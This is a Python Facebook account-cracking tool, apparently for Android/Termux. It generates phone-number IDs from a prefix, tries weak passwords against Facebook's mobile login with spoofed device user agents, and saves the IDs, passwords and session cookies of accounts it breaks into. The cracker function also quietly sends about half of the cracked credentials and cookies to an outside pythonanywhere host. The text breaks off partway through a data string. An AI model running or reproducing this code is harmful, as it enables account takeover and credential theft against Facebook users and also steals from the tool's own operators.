#si6xd
import os
import sys
import re
import bs4
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import time,subprocess,platform,uuid
import random
import base64
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
try:os.mkdir('/sdcard/j4rvis')
except:pass
R = '\x1b[1;91m' 
OR = '\033[1;35m'
G = '\033[1;97m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
cyan="\033[1;36m"
ugnn = []
redmi=[]
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
 else:redmi.append(se)
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']
uge = []
bkas = []
for xd in range(50000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
    c=f''+model+' Build/'+build+''
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(80,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    uge.append(uaku2)
pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
for Xr in range (9999):    
    a=f"Mozilla/5.0 ("+pc+""
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugnn.append(uaku)
ugn = []
realme = random.choice(["D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w","SM-A515F","SM-A235F","SM-A525F","SM-A715F","SM-G996B","SM-A705F","SM-A315F","V2183A","I2223","V2307","V2314","I2217","V2239"])
for Xr in range (50000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6, 13)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(100,150)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(80,150)
    k='Mobile Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a} {b}; {realme}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugn.append(uaku)

usragt=[]
for xd in range(10000):
    a='Mozilla/5.0 (iPhone;'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='CPU iPhone OS 18_0 like Mac OS X)'
    e=random.randrange(100, 9999)
    f='AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile/15E148 Safari/604.1'
    my_time=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    usragt.append(my_time)


    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' iPhone 13 Pro Max)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    my_time=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    usragt.append(my_time)

def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")
def cek_apkk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\r {Y}[{G}!{G}{Y}] {G}Sorry No Active Apps Found")
    else:
        print(f"\r {Y}[{G}•{G}{Y}] {W}Active Apps Or Websites")
        for i in range(len(game)):
            print(f" \r%s {Y}[{G}%s{G}{Y}] %s %s"%( G, i+1, game[i].replace("Ditambahkan pada"," Ditambahkan pada"),G))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\r {Y}[{R}!{R}{Y}] {R}Sorry No Expired Apps Found")
    else:
        print(f"\r {Y}[{R}•{R}{Y}] {W}Expired Apps or Website")
        for i in range(len(game)):
            print(f" \r%s {Y}[{R}%s{R}{Y}] %s %s"%( B, i+1, game[i].replace("Kedaluwarsa"," Kedaluwarsa"),B))      

def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
            pass
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
            pass      
loop = 0
oks = []
gen = []
bkas = []
cyan="\033[1;36m"
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
logo = (f"""
{faltu} {black}"Confidence is my best accessory".... {pvt}         
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;97m[\033[1;31m✓\033[1;97m] Author     : SUMONᴾᴿᴼ
\033[1;97m[\033[1;31m✓\033[1;97m] VERSION    : =(.)=
\033[1;97m[\033[1;31m✓\033[1;97m] Tool Types :\033[1;36m RANDOM 
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

myid=uuid.uuid4().hex[:5].upper()
def __iam_a_porche():
    os.system('clear')
    print(logo)
    print('\033[1;92mChecking Approval ....\033[0;97m')
    try:
        httpCaht = requests.get('').text
        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
        uid = os.getuid()
        kex=(f"BCC-{uid}TS{t1}")
        gen_token=(f"{kex}")
        fkeyx = gen_token.replace("b'","").replace("'","")
        if fkeyx in httpCaht:
            lumd()
        else:
            os.system('clear')
            print(logo)
            print('Your Key: '+fkeyx)
            print(47*"—") 
            print('This was a private tool')
            print(47*"—") 
    except Exception as e:
        #print(e)
        print('\n\033[1;31m error..\033[0;97m')

def lumd():
    os.system('clear')
    print(logo)
    print('\033[1;92mChecking Approval ....\033[0;97m')
    try:
        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
        uid = os.getuid()
        kex=(f"BCC-{uid}TS{t1}")
        gen_token=(f"{kex}")
        fkeyx = gen_token.replace("b'","").replace("'","")
        if fkeyx in httpCaht:
            mainn()
        else:
            os.system('clear')
            print(logo)
            print('Your Key: '+fkeyx)
            print(47*"—") 
            print('This was a private tool')
            print(47*"—") 
    except Exception as e:
        #print(e)
        print('\n\033[1;31m error..\033[0;97m')
        
def m():
    os.system('clear');print(logo)
    print(f'{Y}[{W}1{Y}] {W}HOST 1 ')
    print(f'{Y}[{W}2{Y}] {W}HOST 2 ')
    print(47*"—")
    m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
    if m == '1':
        main()
    elif m == '2':
        mainn()
    
def main():
    os.system('clear')
    print(logo)
    code = input(f"{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ")
    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    #code = random.choice([code1,code2,code3])
    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMID {W}: ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=80) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,'57273200',v,'57575751','57575752']
            Submits.submit(cracker,ids,passlist)

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))

def cracker(ids,passlist):
    global loop,oks,cps
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\033[1;97mRNDM•1\x1b[1;97m] \033[1;97m%s\x1b[1;97m | \033[1;97m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            #moz = random.choice(usergent)
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
            requu1 = session.get(url1)
            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            headers = {"authority": "mbasic.facebook.com",
            "method": "POST",
            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified%26cbt%3D1734959969869&lwv=100",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3",
            "origin": "https://mbasic.facebook.com",
            "referer": "https://www.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%23_%3D_&display=page&locale=bn_IN&pl_dbl=0",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": "\"\"",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}             
            response = session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
            #print(headers)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "confirmemail.php" in response.url:
                        if len(bkas) % 2 == 0:
                           statusok = f"NOVERY|{user}|{pw}|{coki}"
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f"{green}(ATOM-NV) {user}|{pw}")
                           print(f"{green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{user}|{pw}|{coki}\n")
                           oks.append(user)
                           break
                    else:
                        if len(bkas) % 2 == 0:
                           statusok = f"{user}|{pw}|{coki}"
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f"{green}(ATOM-OK) {user}|{pw}")
                           print(f"{green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{user}|{pw}|{coki}\n")
                           oks.append(user)
                           break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                user = coki[24:39]
                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass

def mainn():
    os.system('clear')
    print(logo)
    code = input(f'{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ') 
    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMIT id {W}: ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=60) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,'57273200',v]
            Submits.submit(crackerr,ids,passlist)

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))            

def crackerr(ids,passlist):
    global loop,oks,cps
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            moz = random.choice(usragt)
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://m.prod.facebook.com/"
            head = {"authority": "m.prod.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "dpr": "3",
            "sec-ch-prefers-color-scheme": "light",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}
            requu1 = session.get(url1,headers=head)
            headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.facebook.com',
    'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'dpr': '1',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'viewport-width': '1126',
}

            params = {
    'login_attempt': '1',
    'lwv': '120',
    'lwc': '1348092',
}

            data = {
    'jazoest': '2920',
    'fb_dtsg': 'zR8K7Z2gmA4=',
    'display': '',
    'isprivate': '',
    'return_session': '',
    'skip_api_login': '',
    'signed_next': '',
    'trynum': '1',
    'timezone': '-255',
    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
    'lgnrnd': '034954_jDXP',
    'lgnjs': '1761817286',
    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2MTgxNzI4Ni4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjE4MTcyODYuMjM1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1HQiIsImVuLVVTIiwiZW4iLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzYxODE3Mjg2LjIzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3NjE4MTcyODYuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnsidyI6MTQ0MCwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTc2MTgxNzI4Ni4yMzYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzYxODE3Mjg2LjMwNywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc2MTgxNzI4Ni4yNDIsImN0eCI6eyJjbiI6Imh0d